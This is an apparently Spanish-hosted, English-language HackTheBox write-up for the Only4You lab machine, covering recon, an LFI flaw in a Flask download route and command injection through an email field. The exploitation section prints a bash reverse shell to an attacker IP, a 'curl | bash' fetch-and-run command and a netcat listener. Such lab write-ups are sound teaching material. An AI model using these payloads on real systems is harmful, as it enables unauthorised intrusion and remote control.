
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Only4You - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
    <link rel="stylesheet" href="/monokai.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">WriteUPs</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/medium/only4you/img/only4you.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Only4You - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Only4You">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">OnlyForYou</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">04</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>Recon:</h3><br/>
We begin with the reconnaissance phase, remembering that this is the most crucial part, as all the information we can gather initially may be useful later during the exploitation phase.<br/><br/>
<h4>Port Scan</h4>
Machines typically offer services, and these services are exposed through ports. Therefore, we need to determine which of these ports are open in order to start exploiting vulnerable services.<br/><br/>
In this case, we use the <code>nmap</code> tool to scan all ports (65535)<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.210</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>

<span class="n">Host</span> <span class="n">discovery</span> <span class="n">disabled</span> <span class="p">(</span><span class="o">-</span><span class="n">Pn</span><span class="p">)</span><span class="o">.</span> <span class="n">All</span> <span class="n">addresses</span> <span class="n">will</span> <span class="n">be</span> <span class="n">marked</span> <span class="s1">'up'</span> <span class="ow">and</span> <span class="n">scan</span> <span class="n">times</span> <span class="n">may</span> <span class="n">be</span> <span class="n">slower</span><span class="o">.</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">29</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span> <span class="n">EDT</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span>
<span class="n">Scanning</span> <span class="mf">10.10.11.210</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.11.210</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.11.210</span>
<span class="n">Completed</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span><span class="p">,</span> <span class="mf">15.49</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">65535</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.210</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>

<span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="n">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/../</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">15.65</span> <span class="n">seconds</span>
           <span class="n">Raw</span> <span class="n">packets</span> <span class="n">sent</span><span class="p">:</span> <span class="mi">75845</span> <span class="p">(</span><span class="mf">3.337</span><span class="n">MB</span><span class="p">)</span> <span class="o">|</span> <span class="n">Rcvd</span><span class="p">:</span> <span class="mi">75825</span> <span class="p">(</span><span class="mf">3.033</span><span class="n">MB</span><span class="p">)</span>
</pre></div>

We can see that the scan has found two open ports (80 and 22). Now, we will proceed to perform a scan of the technologies and versions running on these ports.<br/><br/>
Once again, we will use the <code>nmap</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.210</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">29</span> <span class="mi">12</span><span class="p">:</span><span class="mi">35</span> <span class="n">EDT</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.210</span> <span class="p">(</span><span class="mf">10.10.11.210</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.5</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3072</span> <span class="n">e883e0a9fd43df38198aaa35438411ec</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">83</span><span class="n">f235229b03860c16cfb3fa9f5acd08</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">445</span><span class="n">f7aa377690a77789b04e09f11db80</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">20.49</span> <span class="n">seconds</span>
</pre></div>
<h3><br>Web Reconnaissance:</br></h3><br>
After the scan, we can see that when accessing the website using the IP address, it redirects us to a domain: only4you.htb.<br/><br/>
The issue is that during the redirection, our request does not know what that domain is. To avoid this problem, we will add the domain to the /etc/hosts file.<br/><br/>
<div class="highlight"><pre><span></span><span class="c1"># Host addresses</span>
<span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>  <span class="n">Parrot</span>
<span class="p">::</span><span class="mi">1</span>        <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="mf">10.10.11.210</span> <span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

With this done, we will begin recognizing the technologies used by the website from the console, using the tool WhatWeb:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">whatweb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

We don't see anything particularly interesting at the moment; we can only highlight an email address.<br/><br/>
On the web front, we have the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/2.png"/><br/><br/>
<a href="https://www.wappalyzer.com/">Wappalyzer</a> shows us the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/3.png"/><br/><br/>
There isn't anything interesting here either.<br/><br/>
If we browse through the website a bit, there's a "Frequently Asked Questions" section in which there's one in particular that provides us with relevant information:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/4.png"/><br/><br/>
The question "Are there some products available to check?" contains a hyperlink that leads us to a URL of a subdomain of the machine.<br/><br/>
beta.only4you.htb<br/><br/>
We add this domain to the /etc/hosts file.<br/><br/>
<div class="highlight"><pre><span></span><span class="c1"># Host addresses</span>
<span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>  <span class="n">Parrot</span>
<span class="p">::</span><span class="mi">1</span>        <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="mf">10.10.11.210</span> <span class="n">only4you</span><span class="o">.</span><span class="n">htb</span> <span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

At first glance on the website, there's a button that allows us to download source code, which I believe belongs to the source code of the page on this subdomain.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/5.png"/><br/><br/>
Once the file is downloaded, we can see that it's a zip file which contains the following files:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">beta</span>
<span class="n">beta</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
<span class="n">beta</span><span class="o">/</span><span class="n">static</span>
<span class="n">beta</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">img</span>
<span class="n">beta</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="n">image</span><span class="o">-</span><span class="n">resize</span><span class="o">.</span><span class="n">svg</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">400.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">500.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">405.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="nb">list</span><span class="o">.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">resize</span><span class="o">.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">404.</span><span class="n">html</span>
<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span>
<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">resize</span>
<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="nb">list</span>
<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">convert</span>
<span class="n">beta</span><span class="o">/</span><span class="n">tool</span><span class="o">.</span><span class="n">py</span>
</pre></div>

It appears that we were correct, and it indeed belongs to the source code of the beta.only4you.htb page.<br/><br/>
After analyzing the source code a bit, we can see that in the main.py file, there's a function that allows us to read files from the victim machine, indicating that it is vulnerable to Local File Inclusion (LFI).<br/><br/>
Here's the <code>download</code> function from main.py:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/download'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'image'</span><span class="p">]</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
    <span class="k">if</span> <span class="s1">'..'</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">filename</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">'../'</span><span class="p">):</span>
        <span class="n">flash</span><span class="p">(</span><span class="s1">'Hacking detected!'</span><span class="p">,</span> <span class="s1">'danger'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/list'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isabs</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'LIST_FOLDER'</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
            <span class="n">flash</span><span class="p">(</span><span class="s1">'Image doesn</span><span class="se">\'</span><span class="s1">t exist!'</span><span class="p">,</span> <span class="s1">'danger'</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/list'</span><span class="p">)</span>
    <span class="k">except</span> <span class="p">(</span><span class="ne">TypeError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">BadRequest</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</pre></div>

The request we need to make should be a POST request, specifying a parameter called <code>image</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/8.png"/><br/><br/>
After conducting some tests, we can see that simply by providing the absolute path of the file we want to read, we can access it.<br/><br/>
After a bit of research on the machine, I tried reading certain nginx configuration files to see what I could find. In this case, the file that revealed relevant information was:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">available</span><span class="o">/</span><span class="n">default</span>
</pre></div>

In this case, it reveals certain information that we can use to our advantage:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/9.png"/><br/><br/>
The pertinent information is the path where the main page is located, the one we had seen by accessing it with just the domain without specifying the subdomain:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

The path we found is as follows:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

You might think about conducting fuzzing on this directory, but in my case, it wasn't necessary. I simply tried files that would likely exist in the directory, such as: app.py<br/><br/>
<div class="highlight"><pre><span></span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/10.png"/><br/><br/>
This file caught my attention because it only contained information about the contact section of the main page, which is a form for supposedly sending a message:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/11.png"/><br/><br/>
In this case, to analyze the code more thoroughly, I made a curl request to access the file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">download</span> <span class="o">-</span><span class="n">d</span> <span class="s2">"image=/var/www/only4you.htb/app.py"</span>
</pre></div>

Looking at the code, we can see that it calls a function named <code>sendmessage</code> from a supposed library called <code>form</code>.<br/><br/>
The first thing that occurred to me was to check if that <code>form</code> library is located within the same directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">download</span> <span class="o">-</span><span class="n">d</span> <span class="s2">"image=/var/www/only4you.htb/form.py"</span>
</pre></div>

We can see that the output of the command returns the file form.py, the supposed library that contains the sendmessage function.<br/><br/>
We can also see that when the issecure function is defined, it expects two parameters: email, which I assume is the email entered in the form on the main page, and ip, which probably represents the client making the request:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">issecure</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
</pre></div>

This parameter is processed using regular expressions to verify that it is legitimate and does not contain any malicious payloads.<br/><br/>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
    <span class="k">return</span> <span class="mi">0</span>
</pre></div>

Subsequently, there is processing of this parameter that extracts only the domain, or more precisely, the information that comes after the "@" symbol.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">domain</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"@"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</pre></div>

Finally, with the "domain" variable, which stores the domain entered after the "@" symbol, it executes the "dig" command to make a DNS request.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">"dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">"</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
</pre></div>

Everything seems fine, but the problem begins with the regular expression that checks the "email" parameter, as it does not verify the presence of <code>;</code> in the email, giving us the possibility to inject commands.<br/><br/>
We should remember that to inject commands, we will need to place the <code>;</code> after the "@" symbol, as otherwise, it won't work because the variable used to execute the "dig" command stores only what comes after the "@" symbol in the "email" parameter.<br/><br/>
The idea is as follows: we will intercept the request from the main page's form using Burp Suite and alter the content of the "email" parameter. We will attempt to send an ICMP trace (ping) from the victim machine to our machine:<br/><br/>
Let's not forget to URL-encode our payload:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mf">10.10.16.4</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/12.png"/><br/><br/>
First, we put ourselves in listening mode from our machine using tcpdump:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
</pre></div>

And we send the request:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/14.png"/><br/><br/>
As we can see, we have received the trace, and we have achieved remote command execution (RCE).<br/><br/>
<h3><br>Shell as www-data</br></h3><br>
With that done, now we will attempt to send a TCP Reverse Shell to our attacker machine. To do this, we will create an <code>index.html</code> file in which we will store a malicious payload written in bash that sends us a Reverse Shell.<br/><br/>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.4</span><span class="o">/</span><span class="mi">443</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>

The command to execute on the victim machine is as follows:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">curl</span> <span class="mf">10.10.16.4</span> <span class="o">|</span> <span class="n">bash</span>
</pre></div>

The idea is to create an HTTP server in Python that serves the index.html file, and when the victim machine requests that file, it interprets it with bash and sends the shell to a port where we will be listening with <code>nc</code> (netcat).<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">443</span>
</pre></div>

Once the listening servers are ready, we will send the request:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/15.png"/><br/><br/>
Finally, we obtain a shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.92</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">443</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.210</span><span class="o">.</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.210</span><span class="p">:</span><span class="mf">46674.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1008</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="p">:</span><span class="o">~/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="err">$</span>
</pre></div>

Before we start with privilege escalation, I like to work comfortably to avoid issues. Therefore, let's set up a TTY to be able to use keyboard shortcuts like CTRL+C, CTRL+L, etc.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@only4you</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
